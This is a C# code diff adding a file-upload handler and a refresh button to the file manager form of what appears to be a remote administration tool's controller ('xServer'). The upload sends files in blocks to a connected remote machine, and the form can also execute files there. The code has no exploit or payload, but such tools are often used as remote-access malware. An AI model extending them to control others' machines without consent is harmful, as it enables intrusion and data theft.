@@ -107,6 +107,92 @@ namespace xServer.Forms
             }
         }
 
+        private void ctxtUpload_Click(object sender, EventArgs e)
+        {
+            using (var ofd = new OpenFileDialog())
+            {
+                ofd.Title = "Select files to upload";
+                ofd.Filter = "All files (*.*)|*.*";
+                ofd.Multiselect = true;
+
+                if (ofd.ShowDialog() == DialogResult.OK)
+                {
+                    var remoteDir = _currentDir;
+                    foreach (var filePath in ofd.FileNames)
+                    {
+                        if (!File.Exists(filePath)) continue;
+
+                        string path = filePath;
+                        new Thread(() =>
+                        {
+                            int id = FileHelper.GetNewTransferId();
+
+                            if (string.IsNullOrEmpty(path)) return;
+
+                            AddTransfer(id, "Uploading...", Path.GetFileName(path));
+
+                            int index = GetTransferIndex(id);
+                            if (index < 0)
+                                return;
+
+                            FileSplit srcFile = new FileSplit(path);
+                            if (srcFile.MaxBlocks < 0)
+                            {
+                                UpdateTransferStatus(index, "Error reading file", 0);
+                                return;
+                            }
+
+                            string remotePath = Path.Combine(remoteDir, Path.GetFileName(path));
+
+                            if (string.IsNullOrEmpty(remotePath)) return;
+
+                            _limitThreads.WaitOne();
+                            for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
+                            {
+                                if (_connectClient.Value == null || _connectClient.Value.FrmFm == null)
+                                {
+                                    _limitThreads.Release();
+                                    return; // abort upload when from is closed or client disconnected
+                                }
+
+                                if (CanceledUploads.ContainsKey(id))
+                                {
+                                    UpdateTransferStatus(index, "Canceled", 0);
+                                    _limitThreads.Release();
+                                    return;
+                                }
+
+                                decimal progress =
+                                    Math.Round((decimal)((double)(currentBlock + 1) / (double)srcFile.MaxBlocks * 100.0), 2);
+
+                                UpdateTransferStatus(index, string.Format("Uploading...({0}%)", progress), -1);
+
+                                byte[] block;
+                                if (srcFile.ReadBlock(currentBlock, out block))
+                                {
+                                    new Core.Packets.ServerPackets.DoUploadFile(id,
+                                        remotePath, block, srcFile.MaxBlocks,
+                                        currentBlock).Execute(_connectClient);
+                                }
+                                else
+                                {
+                                    UpdateTransferStatus(index, "Error reading file", 0);
+                                    _limitThreads.Release();
+                                    return;
+                                }
+                            }
+                            _limitThreads.Release();
+
+                            if (remoteDir == _currentDir)
+                                RefreshDirectory();
+
+                            UpdateTransferStatus(index, "Completed", 1);
+                        }).Start();
+                    }
+                }
+            }
+        }
+
         private void ctxtExecute_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem files in lstDirectory.SelectedItems)
@@ -356,6 +442,11 @@ namespace xServer.Forms
                     }).Start();
                 }
             }
+        }
+
+        private void btnRefresh_Click(object sender, EventArgs e)
+        {
+            RefreshDirectory();
         }
 
         private void FrmFileManager_KeyDown(object sender, KeyEventArgs e)
